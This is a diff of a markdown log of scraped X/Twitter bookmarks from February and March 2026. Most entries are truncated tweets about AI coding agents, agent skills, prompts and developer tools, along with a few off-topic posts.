+The subagent definitions are compatible with Nicos, my subagents tho work with cmux and are fully interactive, interruptable sessions of Pi that report back.  https:// g/tree/main/extensions/subagents …
 
-1. Reviews commits
-2. Suggests patch/minor/major
-3. Generates changelog + changeset
+- https://x.com/DanielGri/status/2033590160936350015
+- Link: https://t.co/7XtFtOTPCV
+
+---
+
+[[2026-03-15]] 🗓️
+
+@DanielMiessler
+
+Another feature we have in PAI is a /council skill.
+
+Problem: You want expert opinions but don't have access to them.
+
+/council creates multiple, relevant agent experts on the topic and HAS THEM DEBATE across multiple rounds and return the results to the thread.
+
+- https://x.com/DanielMiessler/status/2033288165184962971
 - Link: none
 
-[[2026-02-03]] 🗓️
+---
 
-**@hey_zilla** / https://x.com/hey_zilla/status/2018575189789806694
+[[2026-03-14]] 🗓️
 
-for everyone wondering what Pi is...
-- Link: https://github.com/badlogic/pi-confi
+@lukepierceops
 
-**@thetripathi58** / https://x.com/thetripathi58/status/2018710254595555474
+Automation consultants charge $15K for what Claude Code now does in 2 hours.
 
-Final interview.
-They ask: "When can you start?"
-Your mind blanks.
+I know because we're the ones who used to charge it.
 
-You say: "I have a 3-month notice period."
-Interview ends. No offer.
+Here's the exact process:
 
-Here's what they actually want…
+Step 1: Discovery (20 min) 
+→ Paste your org chart, tool stack, and top 3 bottlenecks 
+→ Claude interviews you with
+
+- https://x.com/lukepierceops/status/2032813461399392412
 - Link: none
 
-[[2026-02-08]] 🗓️
+---
 
-**@AIPandaX** / https://x.com/AIPandaX/status/2020436991863865717
+[[2026-03-14]] 🗓️
 
-1. Flexible Route Optimizer
+@DanielGri
 
-"Find cheapest routes from [departure] to [destination] using flexible dates, nearby airports, alternate airlines, and creative layovers while keeping travel time reasonable."
+People shouldn't sleep on  https://  uses libghostty for the terminal and you can have your clanker opening new ones etc. like tmux just nicer UX. Made a skill and extension to work nicely with PI:  https:// g/blob/main/extensions/cmux/index.ts …   https:// g/blob/main/skills/cmux/SKILL.md …
+
+- https://x.com/DanielGri/status/2032717067527303461
+- Link: https://t.co/BUNzXTNVVB
+
+---
+
+[[2026-03-14]] 🗓️
+
+@doodlestein
+
+I just mix this into milk with my creatine and some vanilla syrup. Very painless and easy.
+
+- https://x.com/doodlestein/status/2032856880175849818
 - Link: none
 
-[[2026-02-09]] 🗓️
+---
 
-**@steipete** / https://x.com/steipete/status/2020704611640705485
+[[2026-03-14]] 🗓️
 
-Your @openclaw is too boring? Paste this, right from Molty.
+@hamostaf04
 
-"Read your SOUL.md. Now rewrite it with these changes:
+one of the best explanations i have read!
 
-1. You have opinions now. Strong ones. Stop hedging everything with 'it depends' — commit to a take.
-2. Delete every rule that sounds corporate. If
-- Link: https://molty.app
-
-[[2026-02-11]] 🗓️
-
-**@0xSero** / https://x.com/0xSero/status/2021710890974773307
-
-Did you buy a Mac Mini for openclaw? Let me make your life better. 
-
-1. Install Zed IDE
-2. settings.json and drop this: "use_system_window_tabs": true
-3. click + on the top, add all your repos 
-4. click + do add remote directory
-5. enter your ip or tailscale network ip
-6. use
+- https://x.com/hamostaf04/status/2032638284405608553
 - Link: none
 
-[[2026-02-12]] 🗓️
+---
 
-**@dani_avila7** / https://x.com/dani_avila7/status/2021771260037099877
+[[2026-03-14]] 🗓️
 
-Ghostty + Claude Code + Vercel statusline + Neon statusline + Lazygit
+@doodlestein
 
-How are you handling multitasking when running multiple agents?
+You can do that automatically for every coding agent and get instant search using cass:
 
-Right now it's just two across different projects, but sometimes it's three per project using separate worktrees.
+- https://x.com/doodlestein/status/2032694970830705123
+- Link: https://t.co/UPXkkrPLPS
+
+---
+
+[[2026-03-13]] 🗓️
+
+@ziwenxu_
+
+Someone benchmarked 8 local LLMs on DGX Spark.
+
+If you're wondering which model to run locally, check this article!
+
+- https://x.com/ziwenxu_/status/2032538970333077957
 - Link: none
 
-**@alexhillman** / https://x.com/alexhillman/status/2021779297430569301
+---
 
-I'd been thinking about doing this and now I don't know thank you!
+[[2026-03-13]] 🗓️
+
+@slash1sol
+
+Mind blown: A Chinese quant college student builds an AI swarm engine in 10 days flat, explodes GitHub with 13,000+ stars, and scores $4,000,000 in funding!
+
+Introducing MiroFish is the multi-agent simulator that's revolutionizing predictions for trading, PR, and more.
+
+What is
+
+- https://x.com/slash1sol/status/2032564109791703167
 - Link: none
 
-**@KSimback** / https://x.com/KSimback/status/2021929151293534570
+---
 
-I've now done a half dozen @openclaw installs across home machines and VPS - this is really the best overall guide
+[[2026-03-13]] 🗓️
 
-If you're not sure which VPS provider to use, I wrote an article comparing them (link in comments)
+@DanielMiessler
+
+Put together a /w command for Claude Code.
+
+The Problem: you know you worked on something before but you can't remember which session it was in.
+
+/w that one thing that one time 
+
+Searches your transcripts, sessions, git, and finds it so you can resume.
+   https:// /Personal_AI_Infrastructure/tree/main/Packs/WorkCommand …
+
+- https://x.com/DanielMiessler/status/2032559574138630248
+- Link: https://t.co/pQfkIvZIfQ
+
+---
+
+[[2026-03-13]] 🗓️
+
+@20th_Centurygal
+
+Name one album that’s perfect from start to finish.
+No skips. No filler. Just pure greatness...
+
+- https://x.com/20th_Centurygal/status/2032445860412281106
 - Link: none
 
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2022036754648166527
+---
 
-I just published a skill for using TDD with Claude Code
+[[2026-03-12]] 🗓️
 
-Before: dozens of shit tests, coupled to implementation
-After: only the tests required, validating real behavior
-- Link: https://aihero.dev/s/ioM3t0LMk9
+@tobi
 
-[[2026-02-16]] 🗓️
+And the most important part: we open sourced the /autoresearch plugin for pi. Just tell it what you want, it will do the rest.
 
-**@ryancarson** / https://x.com/ryancarson/status/2023468856220807539
+- https://x.com/tobi/status/2032212536716578932
+- Link: https://t.co/C2H6kxR7jG
 
-I think more and more companies/startups will implement a Code Factory system like this.
+---
 
-Just point your agent at this agent with the prompt 
+[[2026-03-12]] 🗓️
 
-"Read this and create a .md plan for migrating our codebase to a Code Factory model"
+@tobi
+
+OK, well. I ran /autoresearch on the the liquid codebase. 
+53% faster combined parse+render time, 61% fewer object allocations. 
+
+This is probably somewhat overfit, but there are absolutely amazing ideas in this.
+
+- https://x.com/tobi/status/2032212531846971413
 - Link: none
 
-**@nicopreme** / https://x.com/nicopreme/status/2023495040258261460
+---
 
-Created an agent skill called "Visual Explainer" + set of complementary slash commands aimed to reduce my cognitive debt so the agent can explain complex things as rich HTML pages. The skill includes reference templates and a CSS pattern library so output stays consistently
+[[2026-03-11]] 🗓️
+
+@GergelyOrosz
+
+It's always energizing to do a podcast with Steve Yegge ( , engineer+author, formerly at Amazon+Google, creator of Gas Town). Timestamps:
+
+ 00:00  Intro
+ 01:43  Steve’s latest projects
+ 02:27  Important blog posts
+ 04:48  Shifts in what engineers need to know
+ 10:46  Steve’s
+
+- https://x.com/GergelyOrosz/status/2031822369732640957
 - Link: none
 
-**@nbaschez** / https://x.com/nbaschez/status/2023501535343509871
+---
 
-my current favorite trick for reducing "cognitive debt" (h/t @simonw) is to ask the LLM to write two versions of the plan:
+[[2026-03-11]] 🗓️
 
-1. The version for it (highly technical and detailed)
-2. The version for me (an entertaining essay designed to build my intuition)
+@LLMJunky
 
-Works great
+This is one of the most impressive guides I've seen for building games with Codex. 
+
+Even if you're not building any games, just look how impressive this is. 
+
+You're not pushing your agents enough.
+
+We are just barely tapping into their potential.
+
+- https://x.com/LLMJunky/status/2031802820924436506
 - Link: none
 
-[[2026-02-17]] 🗓️
+---
 
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2023712176729715184
+[[2026-03-11]] 🗓️
 
-Important instruction for AI Coding agents writing tests:
+@initjean
 
-"Don't write tests for what the type system already guarantees."
+create one for your fav coding agent, run:
 
-Helps hint against an entire class of shit tests.
+npx slopmeter@latest --codex
+npx slopmeter@latest --claude
+npx slopmeter@latest --opencode
+
+jthe repo is now on github
+
+- https://x.com/initjean/status/2031656919933255719
+- Link: https://t.co/UO32xO93eY
+
+---
+
+[[2026-03-11]] 🗓️
+
+@derrickcchoi
+
+Appreciate all the feedback on the   Codex best practices article I posted yesterday. 
+
+It's now posted on our developer docs! Read here:
+
+- https://x.com/derrickcchoi/status/2031741496903250212
+- Link: https://t.co/VO7SbcD8Il
+
+---
+
+[[2026-03-10]] 🗓️
+
+@CloudflareDev
+
+Introducing the new /crawl endpoint - one API call and an entire site crawled.
+
+No scripts. No browser management. Just the content in HTML, Markdown, or JSON.
+
+- https://x.com/CloudflareDev/status/2031488099725754821
 - Link: none
 
-[[2026-02-18]] 🗓️
+---
 
-**@arscontexta** / https://x.com/arscontexta/status/2023964151614214247
+[[2026-03-10]] 🗓️
 
-build your own skill graph today:
-- Link: https://skills.md
+@dunik_7
 
-**@Nate_Google_** / https://x.com/Nate_Google_/status/2024196080938713439
+a student took the ELO rating system from chess 
 
-for all of you guys that are trying to figure out how to get the most out of OpenClaw
+ran it through 95,491 tennis matches over 43 years, and trained an XGBoost model that predicts winners with 85% accuracy
 
-you're welcome
+he tested it on the Australian Open 2025 completely outside the training data
 
-and here are all of the files:
+99 out of 116 matches correct
 
-IDENTITY:
-
-https://gist.github.com/mberman84/a128371ffb1fc28554f515905a8bddcd
-
-SOUL: 
-https://gist.github.com/mberman84/cd6924c7058ba5251a773dac177ae756
-
-PRD:
-
-https://gist.github.com/mberman84/5ccf2085d0049581b4675f7fe64e9b87
-- Link: https://gist.github.com/mberman84/a128371ffb1fc28554f515905a8bddcd
-
-[[2026-02-19]] 🗓️
-
-**@Amank1412** / https://x.com/Amank1412/status/2024320943641031163
-
-- Link: https://github.com/AmanKumar009/Agent-Skills
-
-**@kloss_xyz** / https://x.com/kloss_xyz/status/2024572078314451146
-
-Most give their OpenClaw tasks.
-
-Almost nobody asks theirs the real questions that make it smarter. 
-
-Your agent understands your context, patterns, blind spots, and workflows. 
-
-It's sitting on insights about YOU that it will never ever surface unless you ask.
-
-These 21 prompts
+- https://x.com/dunik_7/status/2031452419717210322
 - Link: none
 
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2024576093894955369
+---
 
-Claude Code (or Opus 4.6) feels like it asks you far fewer questions during plan mode
+[[2026-03-10]] 🗓️
 
-Try:
+@BrianRoemmele
 
-"Interview me relentlessly about every aspect of this plan until we reach a shared understanding. Walk down each branch of the design tree, resolving dependencies between decisions
+Some folks asked for a fast and easy open source way to test a Zero-Human Company concept I invented.
+
+Well here it is.
+
+Read the How-to, it is one line.
+
+- https://x.com/BrianRoemmele/status/2031360839085863108
 - Link: none
 
-**@tom_doerr** / https://x.com/tom_doerr/status/2024632919428354167
+---
 
-Removes AI patterns from text
+[[2026-03-10]] 🗓️
 
-https://github.com/blader/humanizer
-- Link: https://github.com/blader/humanizer
+@FredKSchott
 
-[[2026-02-20]] 🗓️
+Powered by Flue 
 
-**@mattpocockuk** / https://x.com/mattpocockuk/status/2024874219662905676
-
-Here's my AI coding workflow and all the skills I'm using:
-
-Idea -> /write-a-prd -> PRD
-PRD -> /prd-to-issues -> Kanban Board
-Kanban -> ralph.sh -> Ralph Loop
-Ralph Loop -> Manual QA
-
-Links below to skills
+- https://x.com/FredKSchott/status/2031420866672865769
 - Link: none
 
-[[2026-02-21]] 🗓️
+---
 
-**@jxmnop** / https://x.com/jxmnop/status/2025248838907560440
+[[2026-03-09]] 🗓️
 
-it always disappointed me that such a small subset of mathematical ideas matter for AI
+@askalphaxiv
 
-i miss doing real math
+Paste the following into Claude Code!  https:// v-paper-lookup/SKILL.md …
+
+- https://x.com/askalphaxiv/status/2031120124380590293
+- Link: https://t.co/VHVyr5XuDG
+
+---
+
+[[2026-03-09]] 🗓️
+
+@doodlestein
+
+I asked Codex with GPT 5.4 the following about my FrankenEngine project, which I've been working on (along with all my other in-flight projects) for the last 2-3 weeks:
+
+"Where are we on this project? Do we have a working JS and TS engine that can run arbitrary code with good
+
+- https://x.com/doodlestein/status/2030805574091231425
 - Link: none
 
-[[2026-02-24]] 🗓️
+---
 
-**@peterom** / https://x.com/peterom/status/2026401034139046101
+[[2026-03-09]] 🗓️
 
-Dataset: https://huggingface.co/datasets/peteromallet/dataclaw-peteromallet
+@danpacary
 
-Dataclaw:
-- Link: https://huggingface.co/datasets/peteromallet/dataclaw-peteromallet
+This afternoon: SEQ=1024.
 
-[[2026-02-25]] 🗓️
+v3b ran at SEQ=512. MLX runs at 1024. Double context = better language modeling.
 
-**@jameesy** / https://x.com/jameesy/status/2026628809424781787
+72K steps at SEQ=1024 = 74M tokens (2x data). Target: sub-1.3.
 
+First real apples-to-apples ANE vs MLX comparison.
+
+Same chip. Same data. Same context length.
+
+check it
+
+- https://x.com/danpacary/status/2031108095255121952
 - Link: none
 
-[[2026-02-27]] 🗓️
+---
 
-**@zackbshapiro** / https://x.com/zackbshapiro/status/2027389987444957625
+[[2026-03-09]] 🗓️
 
+@doodlestein
+
+Since tax season is again upon us, I thought I’d share my article from last year about how I use AI to help me do my own taxes now instead of spending over two grand like I used to for error-prone tax prep from a CPA. It mentions Opus 3.7; just use 4.6:
+
+- https://x.com/doodlestein/status/2030968188175806974
+- Link: https://t.co/RgxBbj7CgH
+
+---
+
+[[2026-03-09]] 🗓️
+
+@DokPepper
+
+Bon, je vais vous expliquer comment télécharger des films et des séries, tout en profitant de la chute du site YggTorrent (car les sites alternatifs sont passés en freeleech pour faire venir les utilisateurs).
+
+Allez, je vous explique.
+
+1/
+
+- https://x.com/DokPepper/status/2031092618587689402
 - Link: none
 
-**@_Akanoa_** / https://x.com/_Akanoa_/status/2027431590377181606
+---
 
-Un collègue vient de me faire découvrir ça
-- Link: https://github.com/nickvdyck/ghostty
+[[2026-03-08]] 🗓️
 
-[[2026-03-02]] 🗓️
+@JJEnglert
 
-**@itsolelehmann** / https://x.com/itsolelehmann/status/2028497454635888982
+I still can’t believe this is real.
 
-i got claude to actually sound like me, and it's kinda ruining my ability to tell which drafts i wrote myself lol
+I’m a trained filmmaker. Former film producer. I’ve spent thousands of hours in editing bays cutting footage frame by frame.
 
-it's just 1 file (i'm giving the full thing to you below).
+This weekend I’m creating a video for one of the biggest brands in the world. 
 
-you paste it into your cowork context folder and claude stops writing like a generic AI and starts
+Here’s my setup:
+
+Claude Code on the
+
+- https://x.com/JJEnglert/status/2030738657339130128
 - Link: none
 
-**@doodlestein** / https://x.com/doodlestein/status/2028621117288579315
+---
 
-I finally decided to look up wtf these peptides are and why people take them. I think I'd be too scared about long term effects and things like cancer to try anything like this on a discretionary basis, but I guess I can understand why people do them. 
+[[2026-03-08]] 🗓️
 
-I asked GPT-5.2:
+@geetkhosla
 
-"Tell me
+I built something similar focused on founders
+
+- https://x.com/geetkhosla/status/2030702477146767598
+- Link: https://t.co/lzPgzFzW8S
+
+---
+
+[[2026-03-08]] 🗓️
+
+@doodlestein
+
+Not sure if I've ever shared this prompt before, but if you use beads (or my rust version, br) to build out complex development plans, you sort of need to use something like this to avoid wasting time later on in the implementation phase.
+
+The agents will eventually figure this
+
+- https://x.com/doodlestein/status/2030767679179756009
 - Link: none
 
-[[2026-03-03]] 🗓️
+---
 
-**@Framer_X** / https://x.com/Framer_X/status/2028853787029569604
+[[2026-03-08]] 🗓️
 
-AI mini-dramas are exploding 
+@karpathy
 
-Short AI series are pulling in millions of views - TikTok, YT, IG.
+The next step for autoresearch is that it has to be asynchronously massively collaborative for agents (think: SETI@home style). The goal is not to emulate a single PhD student, it's to emulate a research community of them.
 
-And it's easier than you think.
+Current code synchronously grows a single thread of
 
-Here's exactly how
+- https://x.com/karpathy/status/2030705271627284816
+- Link: https://t.co/tmZeqyDY1W
+
+---
+
+[[2026-03-08]] 🗓️
+
+@heyrimsha
+
+I accidentally discovered how to compress a month of research into 3 hours.
+
+A founder at a YC company showed me his Claude setup. I thought he was just fast. Then I watched him build an entire go-to-market strategy for a market he'd never worked in before.
+
+Here's exactly what
+
+- https://x.com/heyrimsha/status/2030614728591167973
 - Link: none
 
-**@ryancarson** / https://x.com/ryancarson/status/2028916090596643078
+---
 
+[[2026-03-08]] 🗓️
+
+@mhdfaran
+
+Cancel your AI video subscriptions immediately.
+
+LTX-2.3 just dropped their production-grade API, giving you direct access to the world’s most downloaded video engine without needing a local GPU.
+
+Save your money. The API era is officially here.
+
+Full breakdown:
+
+- https://x.com/mhdfaran/status/2030650448009715875
 - Link: none
 
-[[2026-03-05]] 🗓️
+---
 
-**@PJaccetturo** / https://x.com/PJaccetturo/status/2029656107434795323
+[[2026-03-07]] 🗓️
 
-We are about to see a massive explosion of books turned into cinema.
+@RoundtableSpace
 
-I used Luma's new agent to build this 'Red Rising' teaser in less than a week.
+Most people have thousands of saved tweets they never find again.
 
-Previously, this series would've needed a $200M+ greenlight. Not anymore.
+Siftly runs a 4-stage AI pipeline on your bookmarks — entity extraction, vision analysis, semantic tagging, categorization — then turns everything into a searchable knowledge base with a mindmap view.
 
-Bookmark my full workflow + Seedance 2.0 prompts
+100%
+
+- https://x.com/RoundtableSpace/status/2030308743078986013
 - Link: none
 
-**@PawelHuryn** / https://x.com/PawelHuryn/status/2029697412701282511
+---
 
-1,300+ stars on GitHub in 72 hours. 400+ in the last 4 hours. I didn't expect this.
+[[2026-03-07]] 🗓️
 
-I built an open-source PM Skills Marketplace for Claude: 100+ skills and commands that turn AI into a product management partner.
+@ihtesham2005
 
-Not generic prompts. Structured skills that actually know PM
+I accidentally discovered how to compress a semester of learning into 48 hours.
+
+A grad student at MIT showed me his NotebookLM setup. I thought he was just organized. Then I watched him pass a qualifying exam on a subject he'd never studied before.
+
+Here's exactly what he did:
+
+- https://x.com/ihtesham2005/status/2030214970353602806
 - Link: none
+
+---
 
 [[2026-03-06]] 🗓️
 
-**@Framer_X** / https://x.com/Framer_X/status/2029961319458480307
+@simplifyinAI
+
+Read the full paper:  https:// 
+
+If you want more practical AI gems and use cases, join our free newsletter with daily tutorials and latest news in AI:  http://
+
+- https://x.com/simplifyinAI/status/2030012335784611899
+- Link: https://t.co/lTubt9GHgQ
+
+---
+
+[[2026-03-06]] 🗓️
+
+@Framer_X
 
 History through AI animation is a cheat code.
 
@@ -1068,18 +854,104 @@ There are infinite ideas, people are universally hooked into stories and it's fa
 
 An A tier category. 
 
-Tutorial
+Tutorial 
+
+- https://x.com/Framer_X/status/2029961319458480307
 - Link: none
 
 ---
 
-## Summary
+[[2026-03-05]] 🗓️
 
-**Total bookmarks scraped: 114 tweets from 2026**
+@PawelHuryn
 
-**Date range:** January 1, 2026 - March 6, 2026
+1,300+ stars on GitHub in 72 hours. 400+ in the last 4 hours. I didn’t expect this.
 
-**Breakdown by month:**
-- January 2026: 74 tweets
-- February 2026: 33 tweets
-- March 2026: 7 tweets
+I built an open-source PM Skills Marketplace for Claude: 100+ skills and commands that turn AI into a product management partner.
+
+Not generic prompts. Structured skills that actually know PM
+
+- https://x.com/PawelHuryn/status/2029697412701282511
+- Link: none
+
+---
+
+[[2026-03-05]] 🗓️
+
+@PJaccetturo
+
+We are about to see a massive explosion of books turned into cinema.
+
+I used Luma’s new agent to build this ‘Red Rising’ teaser in less than a week.
+
+Previously, this series would've needed a $200M+ greenlight. Not anymore.
+
+Bookmark my full workflow + Seedance 2.0 prompts 
+
+- https://x.com/PJaccetturo/status/2029656107434795323
+- Link: none
+
+---
+
+[[2026-03-04]] 🗓️
+
+@simonw
+
+I started a new chapter of my Agentic Engineering Patternw guide about anti-patterns - things NOT to do
+
+So far I only have one: Inflicting unreviewed code on collaborators, aka dumping a thousand line PR without even making sure it works first
+
+- https://x.com/simonw/status/2029260505324412954
+- Link: https://t.co/rg6LVi9zkk
+
+---
+
+[[2026-03-03]] 🗓️
+
+@Framer_X
+
+AI mini-dramas are exploding  
+
+Short AI series are pulling in millions of views - TikTok, YT, IG.
+
+And it’s easier than you think.
+
+Here’s exactly how
+
+- https://x.com/Framer_X/status/2028853787029569604
+- Link: none
+
+---
+
+[[2026-03-02]] 🗓️
+
+@itsolelehmann
+
+i got claude to actually sound like me, and it's kinda ruining my ability to tell which drafts i wrote myself lol
+
+it's just 1 file (i'm giving the full thing to you below).
+
+you paste it into your cowork context folder and claude stops writing like a generic AI and starts
+
+- https://x.com/itsolelehmann/status/2028497454635888982
+- Link: none
+
+---
+
+[[2026-03-02]] 🗓️
+
+@doodlestein
+
+I finally decided to look up wtf these peptides are and why people take them. I think I’d be too scared about long term effects and things like cancer to try anything like this on a discretionary basis, but I guess I can understand why people do them. 
+
+I asked GPT-5.2:
+
+“Tell me
+
+- https://x.com/doodlestein/status/2028621117288579315
+- Link: none
+
+---
+
+
+Total March 2026 bookmarks: 67
